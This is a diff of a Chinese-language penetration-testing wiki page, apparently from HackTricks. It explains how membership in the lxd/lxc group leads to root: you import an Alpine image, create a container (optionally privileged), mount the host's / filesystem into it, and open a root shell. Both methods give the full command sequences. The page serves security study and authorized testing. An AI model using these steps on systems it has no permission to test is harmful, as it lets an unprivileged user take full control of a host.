@@ -1,18 +1,16 @@
 # lxd/lxc Group - Privilege escalation
 
-{{#include ../../../banners/hacktricks-training.md}}
+加入主机的 LXD 管理组（通常为 _**lxd**）后，可以完全控制 daemon，从而获得一条成为 root 的路径。<sup>[[1]](#references)</sup>
 
-如果你属于 _**lxd**_ **或** _**lxc**_ **group**，就可以成为 root
-
-## 在没有 internet 的情况下利用
+## 在没有 internet 的情况下进行 Exploiting
 
 ### Method 1
 
-你可以从可信的 repository 下载一个 alpine image，以便与 lxd 一起使用。  
-Canonical 每天都会在其站点发布构建版本：[https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
-只需从最新的构建版本中获取 **lxd.tar.xz** 和 **rootfs.squashfs**。（目录名称就是日期）。
+你可以从可信 repository 下载 Alpine image，以便与 LXD 一起使用。
+Canonical 的 LXD image server 每日发布构建版本：[https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
+只需从最新构建版本中获取 **lxd.tar.xz** 和 **rootfs.squashfs**（目录名称为日期）。<sup>[[8]](#references)</sup>
 
-或者，你也可以在自己的机器上安装这个 distro builder：[https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder)（按照 github 中的说明操作）：
+或者，你可以按照 [project instructions](https://github.com/lxc/distrobuilder) 在自己的机器上安装 distrobuilder。<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
 ```bash
 # Install requirements
 sudo apt update
@@ -35,7 +33,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 # Create the container - Beware of architecture while compiling locally.
 sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
-上传 **incus.tar.xz**（如果从 Canonical repository 下载，则使用 **lxd.tar.xz**）和 **rootfs.squashfs** 文件，将镜像添加到 repo 并创建一个 container：
+上传 **incus.tar.xz**（如果从 Canonical image server 下载，则为 **lxd.tar.xz**）和 **rootfs.squashfs**，然后导入该 image 并创建 container。<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -51,18 +49,18 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 > [!CAUTION]
-> 如果发现此错误 _**Error: No storage pool found. Please create a new storage pool**_\
-> 运行 **`lxd init`**，并将所有选项设置为默认值。然后**重复**上一段命令
+> 如果遇到此错误 _**Error: No storage pool found. Please create a new storage pool**_\
+> 运行 **`lxd init`**，设置默认 storage pool，然后**重复**上一段命令。<sup>[[2]](#references)</sup>
 
-最后，你可以执行该 container 并获取 root：
+最后，启动 container，并在 host filesystem 上打开 root shell：<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
-### Method 2
+### 方法 2
 
-构建一个 Alpine image，并使用标志 `security.privileged=true` 启动它，强制容器以 root 身份与宿主机文件系统交互。
+构建一个 Alpine image，并使用标志 `security.privileged=true` 启动它，该标志会将 container root 映射为 host root；随后挂载 `/` 即可将 host filesystem 暴露在 container 内。<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -82,4 +80,15 @@ lxc init myimage mycontainer -c security.privileged=true
 # mount the /root into the image
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 ```
+## References
+
+- [1] [如何强化 LXD 的安全性](https://canonical.com/lxd/docs/latest/howto/security_harden/)
+- [2] [LXD 容器和虚拟机](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
+- [3] [如何复制和导入镜像](https://canonical.com/lxd/docs/latest/howto/images_copy/)
+- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
+- [5] [如何使用 distrobuilder 构建镜像](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
+- [6] [Alpine 镜像定义](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
+- [7] [lxd-alpine-builder 构建脚本](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
+- [8] [LXD 镜像服务器](https://images.lxd.canonical.com/)
+- [9] [类型：disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
 {{#include ../../../banners/hacktricks-training.md}}
